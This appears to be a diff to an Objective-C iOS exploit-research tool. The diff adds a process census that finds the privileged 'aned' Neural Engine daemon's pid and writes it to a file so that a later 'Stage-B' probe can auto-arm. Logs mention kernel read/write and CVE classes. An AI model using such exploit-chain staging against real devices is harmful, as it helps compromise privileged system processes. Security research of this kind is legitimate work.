@@ -25,6 +25,7 @@
 #import <sys/sysctl.h>
 #import <sys/time.h>
 #import <mach/mach.h>
+#import <libproc.h>
 
 #define P100_BUILD "p100-autolearn-v3-censusgate"
 
@@ -324,6 +325,46 @@ typedef CFTypeRef (*al_iosCreate_t)(CFDictionaryRef properties);
     L(@"[*] honesty: no KRW claim. A failed/absent tap does not close a CVE class.");
 
     /* ---- 7. LEARN PACKET + registry ---- */
+    /* v4 auto-ARM census (the p100-gate pattern applied to the chain): the
+       pids rotate every boot, so the learner collects the privileged ANE
+       daemon's pid here, writes it to the container Documents, and the
+       FIRING taps (p044 Stage-B procIdx probe, note 226) auto-arm from it. */
+    {
+        int nAll = proc_listallpids(NULL, 0);
+        uint32_t anedPid = 0;
+        char anedName[64] = {0};
+        if (nAll > 0) {
+            pid_t *pids = calloc((size_t)nAll, sizeof(pid_t));
+            int got = proc_listallpids(pids, nAll * (int)sizeof(pid_t));
+            for (int i = 0; i < got; i++) {
+                char nm[64] = {0};
+                if (proc_name(pids[i], nm, sizeof(nm)) <= 0) continue;
+                if (strcmp(nm, "aned") == 0 || strncmp(nm, "aned", 4) == 0) {
+                    anedPid = (uint32_t)pids[i];
+                    memcpy(anedName, nm, sizeof(nm) - 1);
+                    break;
+                }
+            }
+            free(pids);
+        }
+        L(@"[*] [arm-census] aned=%@ (pid>0 = Stage-B auto-arm ready for p044)",
+          anedPid ? [NSString stringWithFormat:@"%u (%s)", anedPid, anedName] : @"NOT-RESOLVED");
+        if (anedPid) {
+            NSString *armPath = [docs stringByAppendingPathComponent:@"p044_proc_idx.txt"];
+            NSString *pidStr = [NSString stringWithFormat:@"%u\n", anedPid];
+            int afd = open(armPath.fileSystemRepresentation,
+                           O_CREAT | O_WRONLY | O_TRUNC, 0644);
+            if (afd >= 0) {
+                (void)write(afd, pidStr.UTF8String, strlen(pidStr.UTF8String));
+                fcntl(afd, F_FULLFSYNC);
+                close(afd);
+                L(@"[*] [arm-census] p044_proc_idx.txt WRITTEN (%u) — p044 tap auto-arms Stage-B next tap", anedPid);
+            } else {
+                L(@"[-] [arm-census] arm-file open failed errno=%d", errno);
+            }
+        }
+    }
+
     L(@"=== LEARN PACKET BEGIN (copy this whole block back) ===");
     NSMutableString *pkt = [NSMutableString string];
     [pkt appendFormat:@"machine=%@ osversion=%@ osrelease=%@ darwin=%lld chip_tag=%@ chip_family=%@ ",
